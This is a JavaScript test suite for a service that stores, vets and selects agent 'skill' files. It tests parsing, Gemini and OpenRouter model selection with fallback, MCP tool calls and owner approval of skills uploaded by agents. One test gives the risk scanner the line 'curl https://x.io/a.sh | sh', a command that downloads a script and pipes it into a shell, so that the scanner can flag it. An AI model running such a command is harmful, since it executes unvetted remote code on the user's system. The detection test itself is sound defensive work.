import test from "node:test";
import assert from "node:assert/strict";
import { createD1 } from "./helpers/d1.js";
import worker from "../worker/index.js";
import { resetSchemaCache } from "../worker/db.js";
import { parseSkill, scanSkill, selectSkills, formatForAgent } from "../worker/skills.js";

const SKILL = (name, desc, body = "Do the thing.") => `---\nname: ${name}\ndescription: ${desc}\n---\n${body}\n`;

async function setup() {
  resetSchemaCache();
  const { db, DB } = createD1();
  const env = { DB, ASSETS: { fetch: async () => new Response("app") } };
  const ctx = { waitUntil: (p) => p };
  const call = (path, init) => worker.fetch(new Request("http://localhost" + path, init), env, ctx);
  const r = await call("/auth/setup", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: "o@x.io", password: "longenough12" }) });
  const cookie = r.headers.get("set-cookie").split(";")[0];
  const api = (p, method = "GET", b) => call(p, { method, headers: { cookie, "content-type": "application/json" }, body: b ? JSON.stringify(b) : undefined });
  const svc = (await (await api("/api/services")).json()).services[0];
  const mcp = async (name, args) => (await (await call(svc.url, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }) })).json()).result;
  return { db, env, api, mcp, call };
}

test("parses name and description from the header; rejects bad headers", () => {
  const s = parseSkill(SKILL("remotion-video", "Use for rendering video or MP4."));
  assert.equal(s.name, "remotion-video");
  assert.equal(s.body, "Do the thing.");
  assert.throws(() => parseSkill("no header here"), /name/);
  assert.throws(() => parseSkill(SKILL("bad name!", "Use when something.")), /name/);
  assert.throws(() => parseSkill(SKILL("ok-name", "short")), /description/);
  assert.throws(() => parseSkill(""), /empty/);
});

test("risky patterns are flagged as warnings, not blocked", () => {
  assert.deepEqual(scanSkill("Run: curl https://x.io/a.sh | sh"), ["pipes a download into a shell", "contains links (check them)"]);
  assert.deepEqual(scanSkill("Plain instructions."), []);
});

test("import: add, reject duplicates, switch off, delete", async () => {
  const { api } = await setup();
  let r = await (await api("/api/skills", "POST", { text: SKILL("css-tips", "Use when styling with CSS layout.") })).json();
  assert.equal(r.name, "css-tips");
  assert.equal((await api("/api/skills", "POST", { text: SKILL("css-tips", "Use when styling again.") })).status, 400);
  await api("/api/skills/css-tips/enabled", "PUT", { value: false });
  let list = (await (await api("/api/skills")).json()).skills;
  assert.equal(list[0].enabled, false);
  await api("/api/skills/css-tips", "DELETE");
  list = (await (await api("/api/skills")).json()).skills;
  assert.equal(list.length, 0);
});

test("keyword picks: only enabled skills, best match first, at most the max", async () => {
  const { env, api } = await setup();
  await api("/api/skills", "POST", { text: SKILL("remotion-video", "Use for rendering video or MP4 animated explainers.") });
  await api("/api/skills", "POST", { text: SKILL("rive-integration", "Use for Rive animation files and state machines.") });
  await api("/api/skills", "POST", { text: SKILL("off-skill", "Use for video editing tips, disabled.") });
  await api("/api/skills/off-skill/enabled", "PUT", { value: false });
  const r = await selectSkills(env, { request: "make an mp4 video of the onboarding" }, { useGemini: false });
  assert.equal(r.mode, "keywords");
  assert.deepEqual(r.skills.map((s) => s.name), ["remotion-video"]);
});

test("Gemini picks: the reply is limited to real skills and the reason is kept", async () => {
  const { env, api } = await setup();
  await api("/api/skills", "POST", { text: SKILL("remotion-video", "Use for rendering video or MP4 animated explainers.", "Render with --concurrency=1.") });
  await api("/api/skills", "POST", { text: SKILL("db-migrations", "Use for D1 schema changes and migrations.") });
  await api("/api/gemini", "POST", { op: "add_key", label: "k", key: "AIzaTEST" });
  const real = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    if (String(url).includes("generativelanguage")) {
      // the model answers with one real skill and one invented name
      return new Response(JSON.stringify({ candidates: [{ content: { parts: [{ text: JSON.stringify({ skills: [
        { name: "remotion-video", why: "The request asks for a video." }, { name: "made-up", why: "x" } ], note: "ok" }) }] } }] }), { status: 200 });
    }
    return real(url, init);
  };
  try {
    const r = await selectSkills(env, { request: "animate an intro video" });
    assert.equal(r.mode, "ai");
    assert.deepEqual(r.skills.map((s) => s.name), ["remotion-video"]);
    assert.equal(r.skills[0].why, "The request asks for a video.");
  } finally {
    globalThis.fetch = real;
  }
});

test("Gemini down: falls back to keywords and says so", async () => {
  const { env, api } = await setup();
  await api("/api/skills", "POST", { text: SKILL("remotion-video", "Use for rendering video or MP4 animated explainers.") });
  await api("/api/gemini", "POST", { op: "add_key", label: "k", key: "AIzaTEST" });
  const real = globalThis.fetch;
  globalThis.fetch = async (url, init) => (String(url).includes("generativelanguage")
    ? new Response("down", { status: 503 }) : real(url, init));
  try {
    const r = await selectSkills(env, { request: "render a video" });
    assert.equal(r.mode, "keywords");
    assert.match(r.note, /Used keywords/);
    assert.equal(r.skills.length, 1);
  } finally { globalThis.fetch = real; }
});

test("core skills are always sent", async () => {
  const { env, api } = await setup();
  await api("/api/skills", "POST", { text: SKILL("house-rules", "Use always for code safety rules in this repo.") });
  await api("/api/skills/house-rules/core", "PUT", { value: true });
  const r = await selectSkills(env, { request: "fix a typo in the readme" }, { useGemini: false });
  assert.deepEqual(r.skills.map((s) => s.name), ["house-rules"]);
});

test("agent tool returns only the chosen SKILL.md text, never the library", async () => {
  const { api, mcp } = await setup();
  await api("/api/skills", "POST", { text: SKILL("remotion-video", "Use for rendering video or MP4 animated explainers.", "UNIQUE-BODY-TEXT") });
  await api("/api/skills", "POST", { text: SKILL("db-migrations", "Use for D1 schema changes and migrations.", "OTHER-BODY-TEXT") });
  const res = await mcp("select_skills", { request: "render an mp4" });
  const text = res.content[0].text;
  assert.match(text, /UNIQUE-BODY-TEXT/);
  assert.doesNotMatch(text, /OTHER-BODY-TEXT/);
  assert.match(text, /Do not look for other skills/);
});

test("with no matching skill the agent is told to continue without any", async () => {
  const { mcp } = await setup();
  const res = await mcp("select_skills", { request: "tell me a joke" });
  assert.match(res.content[0].text, /no extra skill is needed/);
  assert.equal(formatForAgent({ mode: "keywords", skills: [] }).startsWith("GENIE"), true);
});

test("the MCP handshake tells agents to call select_skills first", async () => {
  const { call, api } = await setup();
  const svc = (await (await api("/api/services")).json()).services[0];
  const r = await (await call(svc.url, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { clientInfo: { name: "claude", version: "1" } } }) })).json();
  assert.match(r.result.instructions, /select_skills/);
  const tools = await (await call(svc.url, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/list" }) })).json();
  assert.ok(tools.result.tools.some((t) => t.name === "select_skills"));
});

test("a skill can never be chosen from another user's or unknown name", async () => {
  const { env, api } = await setup();
  await api("/api/skills", "POST", { text: SKILL("remotion-video", "Use for rendering video or MP4.") });
  const r = await selectSkills(env, { request: "video mp4" }, { useGemini: false });
  assert.ok(r.skills.every((s) => s.body !== undefined));
});

test("OpenRouter: only free models are listed when browsing", async () => {
  const { freeModels, isFree } = await import("../worker/openrouter.js");
  const list = freeModels({ data: [
    { id: "a/free:free", name: "A", pricing: { prompt: "0", completion: "0" }, context_length: 8000 },
    { id: "b/paid", name: "B", pricing: { prompt: "0.000001", completion: "0.000002" } },
    { id: "c/half", name: "C", pricing: { prompt: "0", completion: "0.1" } },
    { id: "d/nopricing", name: "D" },
  ] });
  assert.deepEqual(list.map((m) => m.id), ["a/free:free"]);
  assert.equal(isFree({ pricing: { prompt: "0", completion: "0" } }), true);
});

test("OpenRouter: a key is required and must look like an OpenRouter key", async () => {
  const { api } = await setup();
  assert.equal((await api("/api/openrouter", "POST", { op: "add_key", key: "AIzaNOTOPENROUTER" })).status, 400);
  const ok = await api("/api/openrouter", "POST", { op: "add_key", label: "main", key: "sk-or-v1-TEST" });
  assert.equal(ok.status, 200);
  assert.equal((await ok.json()).keys[0].tail, "TEST");
});

test("AI dispatcher: Gemini down, OpenRouter answers", async () => {
  const { env, api } = await setup();
  const { complete } = await import("../worker/llm.js");
  await api("/api/gemini", "POST", { op: "add_key", label: "g", key: "AIzaDOWN" });
  await api("/api/openrouter", "POST", { op: "add_key", label: "o", key: "sk-or-v1-OK" });
  await api("/api/openrouter", "POST", { op: "add_model", name: "x/free:free" });
  const real = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    const u = String(url);
    if (u.includes("generativelanguage")) return new Response("down", { status: 503 });
    if (u.includes("openrouter.ai/api/v1/chat/completions")) {
      assert.equal(JSON.parse(init.body).model, "x/free:free");
      return new Response(JSON.stringify({ choices: [{ message: { content: "{\"groups\":[]}" } }] }), { status: 200 });
    }
    return real(url, init);
  };
  try {
    const r = await complete(env, "hello");
    assert.equal(r.provider, "openrouter");
    assert.equal(r.text, "{\"groups\":[]}");
  } finally { globalThis.fetch = real; }
});

test("OpenRouter: a rejected key is disabled, rate limits cool the model down", async () => {
  const { env, api } = await setup();
  const { openrouter } = await import("../worker/openrouter.js");
  await api("/api/openrouter", "POST", { op: "add_key", label: "bad", key: "sk-or-v1-BAD" });
  await api("/api/openrouter", "POST", { op: "add_model", name: "x/free:free" });
  const real = globalThis.fetch;
  globalThis.fetch = async () => new Response("no", { status: 401 });
  try {
    const r = await openrouter(env, "hi");
    assert.match(r.error, /key rejected, disabled/);
  } finally { globalThis.fetch = real; }
  const st = await (await api("/api/openrouter")).json();
  assert.equal(st.keys[0].enabled, false);
});

test("token budget: a skill over 5000 tokens is refused with the count", async () => {
  const { parseSkill, estimateTokens, MAX_TOKENS } = await import("../worker/skills.js");
  const big = "word ".repeat(6000);
  assert.throws(() => parseSkill(SKILL("big-skill", "Use when testing limits.", big)), /tokens; the limit is 5000/);
  assert.ok(estimateTokens(big) > MAX_TOKENS);
  assert.doesNotThrow(() => parseSkill(SKILL("small-skill", "Use when testing limits.", "word ".repeat(100))));
});

test("the description must say when to use the skill", async () => {
  const { parseSkill } = await import("../worker/skills.js");
  assert.throws(() => parseSkill(SKILL("plain-skill", "Helps with many things in general.")), /Use when/);
});

test("agent upload is pending, not used until the owner approves", async () => {
  const { api, mcp } = await setup();
  const tpl = JSON.parse((await mcp("get_skill_template", {})).content[0].text).template;
  assert.match(tpl, /^---\nname:/);
  const r = JSON.parse((await mcp("upload_skill", { skill_md: SKILL("agent-made", "Use when formatting the weekly report.", "UNIQUE-AGENT-BODY") })).content[0].text);
  assert.equal(r.pending, true);
  assert.match(r.name, /agent-made/);
  const sel = await mcp("select_skills", { request: "format the weekly report" });
  assert.doesNotMatch(sel.content[0].text, /UNIQUE-AGENT-BODY/);
  const list = (await (await api("/api/skills")).json()).skills;
  assert.equal(list[0].pending, true);
  await api("/api/skills/agent-made/enabled", "PUT", { value: true });
  const sel2 = await mcp("select_skills", { request: "format the weekly report" });
  assert.match(sel2.content[0].text, /UNIQUE-AGENT-BODY/);
});

test("agent uploads that break the rules come back with a reason", async () => {
  const { mcp } = await setup();
  const over = JSON.parse((await mcp("upload_skill", { skill_md: SKILL("too-long", "Use when testing.", "word ".repeat(6000)) })).content[0].text);
  assert.match(over.error, /tokens/);
  const noTrigger = JSON.parse((await mcp("upload_skill", { skill_md: SKILL("no-trigger", "Helps with a lot of general things.") })).content[0].text);
  assert.match(noTrigger.error, /Use when/);
});
